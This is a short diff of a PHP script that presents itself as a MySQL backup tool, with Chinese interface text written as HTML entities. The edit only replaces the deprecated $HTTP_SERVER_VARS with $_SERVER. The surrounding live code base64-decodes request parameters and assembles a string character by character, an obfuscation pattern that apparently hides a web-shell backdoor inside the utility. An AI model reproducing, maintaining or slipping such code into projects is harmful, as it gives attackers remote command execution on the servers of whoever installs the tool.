@@ -10,7 +10,7 @@ $uid=$_REQUEST['uid'];
 $dbps=$_REQUEST['password'];
 $db=$_REQUEST['db'];
 $tip="&#23578;&#26410;&#35774;&#32622;&#65292;&#26080;&#27861;&#22791;&#20221;";
-$f1=$HTTP_SERVER_VARS['php_self'];
+$f1=$_SERVER['PHP_SELF'];
 $CODE=base64_decode($cmd);
 $C0DE=base64_decode($cmd2);
 $t1=$CODE{6}.$CODE{13}.$CODE{11}.$CODE{9}.$CODE{5}.$CODE{14}.$CODE{9}.$CODE{12}.$CODE{15}.$CODE{10}.$CODE{13};
@@ -60,7 +60,7 @@ p{font-size:10pt;}
 </style>
 </head>
 <body><center>
-<form method="post" action="<?php echo $HTTP_SERVER_VARS['php_self'];?>?">
+<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>?">
 <br /><?php echo $tip;?><br />
 <hr><br />
 &#77;&#121;&#83;&#81;&#76;&#20027;&#26426;&#58;&#32;<input name="host" value="<?php echo $host;?>" type="text"  class="tx" size="15"><br /><br />
